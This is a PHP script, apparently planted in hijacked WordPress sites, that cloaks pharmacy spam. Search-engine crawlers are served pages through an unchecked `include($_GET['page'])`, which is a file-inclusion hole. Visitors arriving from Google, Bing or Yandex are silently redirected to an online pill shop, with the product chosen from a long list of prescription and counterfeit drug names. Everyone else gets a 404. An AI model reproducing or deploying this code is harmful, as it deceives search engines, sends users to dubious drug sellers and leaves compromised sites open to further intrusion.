<?php

//ini_set("error_reporting", E_ALL);
//ini_set("display_errors", 1);

$user_agents = array(
   	'Googlebot',
	'Slurp',
	'MSNBot',
	'Teoma',
	'Scooter',
	'ia_archiver',
	'Lycos',
	'Yandex',
	'StackRambler',
	'Mail.Ru',
	'Aport',
	'WebAlta',
	'Crawler',
	'MJ12bot',
	'AhrefsBot',
	'Yahoo',
	'bingbot'
);

$referers = array(
	'google',
	'bing',
	'mail',
	'yandex',
	'yahoo',
	'dmoz'
);

$products = array(
	'abilify',
	'aceon',
	'aciphex',
	'acticin',
	'actigall',
	'actonel',
	'actoplus_met',
	'actos',
	'adalat',
	'adalat_cc',
	'adcirca',
	'advair_diskus',
	'advair_rotacaps',
	'aggrenox',
	'albenza',
	'aldactone',
	'aldara',
	'alesse',
	'allegra',
	'altace',
	'amaryl',
	'amoxil',
	'anafranil',
	'anafranil_sr',
	'antabuse',
	'apcalis_oral_jelly',
	'aralen',
	'arava',
	'arcoxia',
	'aricept',
	'arimidex',
	'aristocort',
	'artane',
	'asacol',
	'atarax',
	'atripla',
	'atrovent',
	'augmentin',
	'avalide',
	'avana',
	'avapro',
	'avelox',
	'aventyl',
	'avodart',
	'aygestin',
	'azelex',
	'azulfidine',
	'bactrim',
	'benicar',
	'benicar_hct',
	'benzoyl',
	'betagan',
	'betapace',
	'biaxin',
	'bimatoprost',
	'boniva',
	'brand_cialis',
	'brand_levitra',
	'brand_viagra',
	'buscopan',
	'buspar',
	'bystolic',
	'calan',
	'calan_sr',
	'cardura',
	'cartia',
	'cartia_xt',
	'casodex',
	'caverta',
	'ceclor',
	'ceclor_cd',
	'ceftin',
	'celebrex',
	'celexa',
	'cellcept',
	'champix',
	'chloromycetin',
	'cialis',
	'cialis_black',
	'cialis_daily',
	'cialis_professional',
	'cialis_soft',
	'cialis_sublingual',
	'cialis_super_active',
	'cialis_super_force',
	'ciloxan',
	'cipro',
	'clarinex',
	'claritin',
	'cleocin',
	'clomid',
	'clozaril',
	'colcrys',
	'colofac',
	'combivir',
	'compazine',
	'cordarone',
	'coreg',
	'cosopt',
	'coumadin',
	'cozaar',
	'crestor',
	'crixivan',
	'cyclogyl',
	'cycrin',
	'cyklokapron',
	'cymbalta',
	'cytoxan',
	'danocrine',
	'deltasone',
	'demadex',
	'depakote',
	'desogen',
	'desyrel',
	'detrol',
	'detrol_la',
	'dexone',
	'diamox',
	'differin',
	'diflucan',
	'dilantin',
	'diovan',
	'diovan_hct',
	'diprolene',
	'dostinex',
	'droxia',
	'dulcolax',
	'duphaston',
	'duricef',
	'efavirenz',
	'effexor',
	'effexor_xr',
	'elavil',
	'eldepryl',
	'elocon',
	'enablex',
	'epivir',
	'eriacta',
	'estrace',
	'eulexin',
	'evista',
	'exelon',
	'famvir',
	'feldene',
	'female_cialis',
	'female_viagra',
	'flagyl',
	'flexeril',
	'flomax',
	'floxin',
	'forzest',
	'fosamax',
	'frumil',
	'furadantin',
	'geodon',
	'gleevec',
	'glucophage',
	'glucophage_xr',
	'glucotrol',
	'glucotrol_xl',
	'glucovance',
	'grifulvin',
	'gyne-lotrimin',
	'hard_on',
	'hard_on_oral_jelly',
	'hydralazine',
	'hytrin',
	'hyzaar',
	'ilosone',
	'imdur',
	'imitrex',
	'imodium',
	'imuran',
	'inderal',
	'inderal_la',
	'indocin',
	'indocin_sr',
	'intagra',
	'isordil',
	'isordil_sublingual',
	'janumet',
	'januvia',
	'kamagra',
	'kamagra_effervescent',
	'kamagra_oral_jelly',
	'kamagra_soft',
	'keflex',
	'kemadrin',
	'keppra',
	'lamictal',
	'lamictal_dispersible',
	'lamisil',
	'lamisil_cream',
	'lamprene',
	'lanoxin',
	'lariam',
	'lasix',
	'levaquin',
	'levitra',
	'levitra_oral_jelly',
	'levitra_professional',
	'levitra_soft',
	'levitra_super_active',
	'levitra_super_force',
	'lexapro',
	'lioresal',
	'lipitor',
	'lithobid',
	'lopid',
	'lopressor',
	'lotemax',
	'lotensin',
	'loxitane',
	'lozol',
	'lozol_sr',
	'luvox',
	'maxalt',
	'medrol_active',
	'mellaril',
	'mentax',
	'mestinon',
	'metaglip',
	'micardis',
	'micardis_hct',
	'micronase',
	'microzide',
	'minipress',
	'minocin',
	'mirapex',
	'mobic',
	'moduretic',
	'motilium',
	'motrin',
	'myambutol',
	'mysoline',
	'namenda',
	'naprosyn',
	'neggram',
	'neurontin',
	'nexium',
	'niaspan',
	'nimotop',
	'nizoral',
	'nizoral_cream',
	'nolvadex',
	'nootropil',
	'norlutate',
	'noroxin',
	'norvasc',
	'norvir',
	'ocuflox',
	'omnicef',
	'onglyza',
	'optivar',
	'oxsoralen',
	'oxytrol',
	'pamelor',
	'parafon',
	'parlodel',
	'patanol',
	'paxil',
	'paxil_cr',
	'pentasa',
	'pepcid',
	'periactin',
	'persantine',
	'penegra',
	'phoslo',
	'plaquenil',
	'plavix',
	'plendil',
	'pletal',
	'ponstel',
	'prandin',
	'precose',
	'premarin',
	'prevacid',
	'priligy',
	'prilosec',
	'principen',
	'pristiq',
	'prograf',
	'prometrium',
	'propecia',
	'proscar',
	'protonix',
	'pyridium',
	'rebetol',
	'reglan',
	'reminyl',
	'renagel',
	'renova',
	'requip',
	'retrovir',
	'revatio',
	'revia',
	'rheumatrex',
	'rhinocort',
	'risperdal',
	'robaxin',
	'rocaltrol',
	'rogaine',
	'rulide',
	'savella',
	'serevent_inhaler',
	'seromycin',
	'seroquel',
	'silagra',
	'sildalis',
	'silvitra',
	'sinemet',
	'sinemet_cr',
	'sinequan',
	'singulair',
	'skelaxin',
	'spiriva',
	'sporanox',
	'stalevo',
	'starlix',
	'strattera',
	'stromectol',
	'suhagra',
	'sumycin',
	'super_avana',
	'suprax',
	'symbicort',
	'symmetrel',
	'synthroid',
	'tadacip',
	'tadalift',
	'tadalis_sx',
	'tadora',
	'tegretol',
	'temovate',
	'tenoretic',
	'tenormin',
	'thorazine',
	'ticlid',
	'timoptic',
	'tofranil',
	'topamax',
	'trandate',
	'trecator-sc',
	'trental',
	'trial_packs',
	'tricor',
	'trileptal',
	'truvada',
	'urispas',
	'uroxatral',
	'valtrex',
	'vaniqa',
	'vantin',
	'vaseretic',
	'vasotec',
	'ventolin',
	'ventolin_inhaler',
	'vepesid',
	'vermox',
	'vesicare',
	'viagra',
	'viagra_capsules',
	'viagra_gold',
	'viagra_professional',
	'viagra_soft',
	'viagra_strips',
	'viagra_sublingual',
	'viagra_super_active',
	'viagra_super_dulox-force',
	'viagra_super_fluox-force',
	'viagra_super_force',
	'vibramycin',
	'videx_ec',
	'vigora',
	'viread',
	'volmax_cr',
	'voltaren',
	'vpxl',
	'vytorin',
	'wellbutrin_sr',
	'xalatan',
	'xeloda',
	'xenical',
	'xifaxan',
	'xylocaine',
	'yasmin',
	'zanaflex',
	'zantac',
	'zebeta',
	'zenegra',
	'zestoretic',
	'zestril',
	'zetia',
	'ziac',
	'ziagen',
	'zithromax',
	'zithromax_dispersible',
	'zocor',
	'zofran',
	'zovirax',
	'zyloprim',
	'zyprexa',
	'zyrtec',
	'zyvox'
);

if(!function_exists("get_404_template")) {
	function get_404_template() {
		include('404.php');
	}
}

if(!function_exists('is_single')) {
	function is_single() {
		return True;
	}
}

if(!function_exists('get_the_title')) {
	function get_the_title() {
		return $_SERVER['REQUEST_URI'];
	}
}

class _302 {
	private $url_parts;

	function __construct() {
		/**
		 * stimulcash.com parameters of advert
		 */
		$this->url_parts = array(
			'shop' => 'http://pills-free-shipping.com/'
		);
	}

	function run() {
		$this->setProductKey();

?>
<html>
	<head>
		<title>Please wait...</title>
		<meta http-equiv="refresh" content="1;URL=<?php echo $this->makeUrl(); ?>" />
	</head>
</html>
<?php 
		exit();
	}

	function makeUrl() {
		/**
		 * making redirect Url
		 */
		$shop = $this->url_parts['shop'];
		unset($this->url_parts['shop']);
		$params = array();
		foreach($this->url_parts as $key => $val) {
			array_push($params, $key.'='.$val);
		}
		return $shop.(empty($params) ? '' : '?').implode('&', $params);
	}

	function setProductKey() {
		/**
		 * set product key to url array
		 */
		global $products;
		if(is_single()) {
			$title = str_replace(' ', '_', get_the_title());
			$pattern = Cloak::make_pattern($products);
			preg_match($pattern, $title, $match);
			if(!empty($match)) {
				$this->url_parts['product'] = $match[0];
			}
		}
	}
}

class _404 {
	function run() {
		get_404_template();
		exit();
	}
}

class _200 {
	function run() {
                if(!file_exists($_GET['page'])) {
                        get_404_template();
                        exit();
                }       
		include($_GET['page']);
		return;
	}
}

class Cloak {
	function __construct() {
	}

	public static function init() {
		/**
		 * routing by Client parameters
		 **/
		$obj = new self();
		if(!$obj->isBot()) {
			if($obj->fromSe()) {
				// if Client from SE kick him to the shop
				return new _302();
			} else {
				// if not then return 404(not found)
				return new _404();
			}
		}
		return new _200();
	}

	protected function isBot() {
		/**
		 * return true if Client is SeBot, or false if not
		 **/
		global $user_agents;
		$pattern = self::make_pattern($user_agents);
		return preg_match($pattern, $_SERVER['HTTP_USER_AGENT']) ? true : false;
	}

	protected function fromSe() {
		/**
		 * return true if Client came from SE, or false if not
		 **/
		global $referers;
		$pattern = self::make_pattern($referers);
		if(isset($_SERVER['HTTP_REFERER'])) {
			return preg_match($pattern, $_SERVER['HTTP_REFERER']) ? true : false;
		}
		return false;
	}

	public static function make_pattern($arr) {
		/**
		 * function making and return regexp pattern 
		 * from array 
		 **/
		return '/('.implode('|', $arr).')/i';
	}
}

$obj = Cloak::init();
$obj->run();
